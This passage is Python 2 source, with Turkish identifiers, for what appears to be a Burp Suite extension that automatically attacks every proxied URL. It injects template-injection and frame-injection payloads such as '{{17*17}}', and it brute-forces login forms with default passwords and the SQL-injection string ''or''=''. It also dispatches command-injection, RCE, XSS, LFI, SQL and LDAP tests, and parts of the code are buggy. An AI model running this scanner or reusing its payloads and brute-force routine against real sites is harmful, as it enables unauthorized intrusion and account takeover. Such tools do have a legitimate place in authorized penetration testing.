                            if "readme.md" in y11.lower():
                                if "readme.md%3E%3C%2Fiframe%3E" not in y11.lower():
                                    self.ekle(method,url,"Frame Injection",parametresaf, y11)
    
    
    
                    except urllib2.HTTPError,e:
                        postgetdict.clear()
                        postgetdict=params.copy()
                    
    
                    except urllib2.URLError,  e:
                        postgetdict.clear()
                        postgetdict=params.copy()
    
                    except:
                        mesaj="Bilinmeyen hata olustu\n" 
                        
                        
    def templateinjection(self,url,params,method):
    
        frameler = ["0x94{{17*17}}","{{17*17}}"]
    
        postgetdict={}
        postgetdict=params.copy()
    
        for framefull in frameler:
            for key,value in params.items():
                if key in postgetdict:
                    postgetdict={}
                    postgetdict[key]=value+framefull
                    try:
                        parametresaf = urllib.urlencode(postgetdict)
                        if method=="GET":
                            y11 = urllib2.urlopen(url+"?"+parametresaf).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
                            if value+"289" in y11.lower():
                                self.ekle(method,url,"Template Injection",parametresaf, y11)
                            
    
    
                        else:
                            #print "Remote Command Execution POST testi yapiliyor"
                            y11 = urllib2.urlopen(url, parametresaf).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
                            if value+"289" in y11.lower():
                                self.ekle(method,url,"Template Injection",parametresaf, y11)
                                
    
                        if value+"0x94289" in y11.lower():
                            self.ekle(method,url,"Template Injection",parametresaf, y11)
                                

    
                    except urllib2.HTTPError,e:
                        postgetdict.clear()
                        postgetdict=params.copy()
                        
    
                    except urllib2.URLError,  e:
                        postgetdict.clear()
                        postgetdict=params.copy()
    
                    except:
                        mesaj="Bilinmeyen hata olustu\n"    
                        
                        
            
    
    def loginbrute(self,url,params,method):
    
    
    
        yakala={}
        yakala=params.copy()
    
        if yakala.has_key("user") or \
          yakala.has_key("username") or \
         yakala.has_key("userinput") or \
         yakala.has_key("usr") or \
           yakala.has_key("uname") or \
        yakala.has_key("id") or \
        yakala.has_key("usernameinput") or \
        yakala.has_key("pass") or \
        yakala.has_key("passwd") or \
        yakala.has_key("password") or \
        yakala.has_key("passwdinput") or \
        yakala.has_key("passwordinput") or \
        yakala.has_key("uid") or \
        yakala.has_key("pwd"):
    
            """loginler=["test",
                      "'or''='",
                     "admin",
                     "secret",
                     "guest",
                     "1234",
                     "123456",
                     "demo123",
                     "demo",
                     "password123",
                     "password1",
                     "qwerty",
                     "abc123",
                     "password1",
                     "administrator",
                     "12341234",
                     "111111",
                     "123456789",
                     "12345678",
                     "1234567",
                     "root",
                     "toor",
                     "pass123",
                     "pass1",
                     "pass2",
                     "pass",
                     "password2",
                     "123123",
                     "admin123",
                     "123admin",
                     "'or''='"]"""
    
            loginler=["test",
                    "'or''='",
                  "admin"]	
    
            passlar=["test",
                   "'or''='",
                 "admin"]	    
    
            """
            passlar=["test",
                     "admin",
                     "secret",
                     "guest",
                     "1234",
                     "123456",
                     "demo123",
                     "demo",
                     "password123",
                     "password1",
                     "qwerty",
                     "abc123",
                     "password1",
                     "administrator",
                     "12341234",
                     "111111",
                     "123456789",
                     "12345678",
                     "1234567",
                     "root",
                     "toor",
                     "pass123",
                     "pass1",
                     "pass2",
                     "pass",
                     "password2",
                     "123123",
                     "admin123",
                     "123admin",
                     "'or''='"]
                     """
    
    
    
    
            dictb1={}
            dictb1=params.copy()
            for key,value in params.items():
    
                try:
                    if key in dictb1:
                        for x in passlar:
                            if key.lower()=="user" or \
                         key.lower()=="pass" or \
                   key.lower()=="username" or \
                   key.lower()=="password" or \
                               key.lower()=="passwd" or \
                            key.lower()=="userinput" or \
                            key.lower()=="uname" or \
                            key.lower()=="uid" or \
                            key.lower()=="id":
                                dictb1[key]="0x94"
    
                    parametrebrute1 = urllib.urlencode(dictb1)
                    if method=="GET":
                        loginnormal = self.temizle(urllib2.urlopen(url+"?"+parametrebrute1).read())
    
                    else:
                        loginnormal = self.temizle(urllib2.urlopen(url, parametrebrute1).read())
    
    
                    for gelenuser in loginler:
                        dictlogin={}
                        dictlogin=params.copy()
                        for gelenpass in passlar:
                            for key,value in params.items():
                                if key in dictlogin:
                                    if key.lower()=="user" or \
                               key.lower()=="usr" or \
                       key.lower()=="username" or \
                       key.lower()=="userinput" or \
                                       key.lower()=="usernameinput" or \
                                    key.lower()=="uname" or \
                                    key.lower()=="id":
                                        dictlogin[key]=gelenuser
    
                                    if key.lower()=="pass" or \
                               key.lower()=="password" or \
                       key.lower()=="passwd" or \
                       key.lower()=="passinput" or \
                                       key.lower()=="passwordinput" or \
                                    key.lower()=="pwd":
                                        dictlogin[key]=gelenpass
    
                            loginsaf = urllib.urlencode(dictlogin)
                            if method=="GET":
                                brutekaynak = self.temizle(urllib.urlopen(url+"?"+loginsaf).read())
                                dictlogin.clear()
                                dictlogin=params.copy()
    
                            else:
                                brutekaynak = self.temizle(urllib2.urlopen(url, loginsaf).read())
                                dictlogin.clear()
                                dictlogin=params.copy()
                                
                                
                            if len(loginnormal)!=len(brutekaynak):
                                
                                self.ekle("LOGIN",url,"Brute Force",url+"\nLogin Data="+loginsaf, brutekaynak)
                                
                                        
    
                except urllib2.HTTPError,e:
                    #print e.reason
                    if(e.code==500):
                        a="sddd"
    
                except urllib2.URLError,  e:
                    if "Time" in e.reason:
                        mesaj="Cok bekledi =  %s , %s \n" %(url,"Login Brute")
                except:
                    mesaj="ddd"
                    #yaz(mesaj)


    
   
      
    def tetikle(self,formurl,toplamveri,method):
    
        if method=="GET":
    
            self.postget(formurl, toplamveri,"GET")
            self.postgettek(formurl, toplamveri,"GET")
            self.blindpost(formurl,toplamveri,"GET")
            self.comandinj(formurl, toplamveri,"GET")
            self.loginbrute(formurl,toplamveri,"GET")
            self.postXSS(formurl, toplamveri,"GET")
            self.ssikontrol(formurl, toplamveri,"GET")
            self.blindcommand(formurl, toplamveri,"GET")
            self.postrce(formurl, toplamveri,"GET")
            self.frameinjection(formurl, toplamveri,"GET")
            self.templateinjection(formurl, toplamveri,"GET")
            
    
        else:
    
            self.postget(formurl, toplamveri,"POST")
            self.postgettek(formurl, toplamveri,"POST")
            self.blindpost(formurl, toplamveri,"POST")
            self.comandinj(formurl, toplamveri,"POST")
            self.loginbrute(formurl,toplamveri,"POST")
            self.postXSS(formurl, toplamveri,"POST")
            self.ssikontrol(formurl, toplamveri,"POST")
            self.blindcommand(formurl, toplamveri,"POST")
            self.postrce(formurl, toplamveri,"POST")
            self.frameinjection(formurl, toplamveri,"POST")
            self.templateinjection(formurl, toplamveri,"POST") 
            
            
    
      
    def ekle(self,method,url,bug,payload,source):
        
        global analistem
        
        if not analistem.has_key(url+bug):
            analistem["method"]=method
            analistem["url"]=url
            analistem["bug"]=bug
            analistem["payload"]=payload
            analistem["source"]=source
            analistem[url+bug]="0x94"
            
            java_URL = URL(url)
        
            self.table_add(method,java_URL,bug,payload,source)        
    


    def table_add(self,method,url,bug,payload,source):
        
        self._lock.acquire()
        row = self._log.size()
        self._log.add(LogEntry(method, url,bug,payload,source))
        self.fireTableRowsInserted(row, row)
        self._lock.release() 
        
        callbacks.issueAlert("String msg")
     
    def scan_starter(self,url): 
        
        try:
            self.normalac(url)
            self.indexoful(url)
            self.formyaz(url)	
            
            if "?" in url and "=" in url:
                self.getrce(url)
                self.phpexec(url)
                self.lfitest(url)
                self.lfitara(url)
                self.headercrlf(url)
                self.getcommandinj(url)
                self.openredirect(url)
                self.sql(url)
                self.timebased(url)
                self.blind(url)
                self.xsstest(url)
                self.getldapvexpath(url) 
                
                
        except:
            err="err"
            
    def starter(self,url):
        
        #threading.Thread(target = scan_starter, args = (self,url,)).start()
        start_new_thread(self.scan_starter,(url,))

                     
        
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        
        dahildegil = (".doc",".tar",".gz",".msi",".flv",".swf",".pkg",".xlsx",".js",".xml",".ico",".css",".gif",".jpg",".jar",".tif",".bmp",".war",".ear",".mpg",".wmv",".mpeg",".scm",".iso",".dmp",".dll",".cab",".so",".avi",".bin",".exe",".iso",".tar",".png",".pdf",".ps",".mp3",".zip",".rar",".gz")
        # only process requests
        if messageIsRequest:
            return



        

        
        #response = messageInfo.getResponse() #get Response from IHttpRequestResponse instance
        #analyzedResponse = self._helpers.analyzeResponse(response)
        #headerList = analyzedResponse.getHeaders() arrraydir


        url=self._helpers.analyzeRequest(messageInfo).getUrl()


        #path = urlparse.urlparse(url.toString()).path
        #ext = os.path.splitext(path)[1]

        #if ext in dahildegil:
 
        
            #self.table_add("XXX",url,"xx","xx","xxx")
                
        self.starter(url.toString())
    
    
        return  
    
    def getRowCount(self):
        try:
            return self._log.size()
        except:
            return 0

    def getColumnCount(self):
        return 3

    def getColumnName(self, columnIndex):
        if columnIndex == 0:
            return "Method"
        if columnIndex == 1:
            return "URL"
        if columnIndex == 2:
            return "Status"
        return ""

    def getValueAt(self, rowIndex, columnIndex):
        logEntry = self._log.get(rowIndex)
        if columnIndex == 0:
            return logEntry._method
        if columnIndex == 1:
            return logEntry._url.toString()
        if columnIndex == 2:
            return logEntry._statu
        return ""


    def getHttpService(self):
        return self._currentlyDisplayedItem.getHttpService()

    def getRequest(self):
        return self._currentlyDisplayedItem.getRequest()

    def getResponse(self):
        return self._currentlyDisplayedItem.getResponse()



class Table(JTable):

    def __init__(self, extender):
        self._extender = extender
        self.setModel(extender)
        return

    def changeSelection(self, row, col, toggle, extend):

        logEntry = self._extender._log.get(row)
        self._extender._requestViewer.setMessage(logEntry._payload, True)    
        self._extender._responseViewer.setMessage(logEntry._response, False)     
       # self._extender._currentlyDisplayedItem = logEntry._response        
        JTable.changeSelection(self, row, col, toggle, extend)
        return


class LogEntry:

    def __init__(self, method, url,status,payload,response):
        decode=urllib.unquote(payload)
        self._method =method
        self._url = url
        self._statu=status
        self._payload=decode
        self._response=response
        return

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService


            
class sendRequestRepeater(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, e):
        #print "COPY SELECTED URL HANDLER ******"

        rows = self._extender.logTable.getSelectedRows()
        for row in rows:

            model_row = self._extender.logTable.convertRowIndexToModel(row)

            request = self._extender._log.get(model_row)._requestResponse
            url = self._extender._log.get(model_row)._url

            host = request.getHttpService().getHost()
            port = request.getHttpService().getPort()
            proto = request.getHttpService().getProtocol()

            secure = True if proto == 'https' else False

            self._extender._callbacks.sendToRepeater(host, port, secure, request.getRequest(), None);

        return 
    
    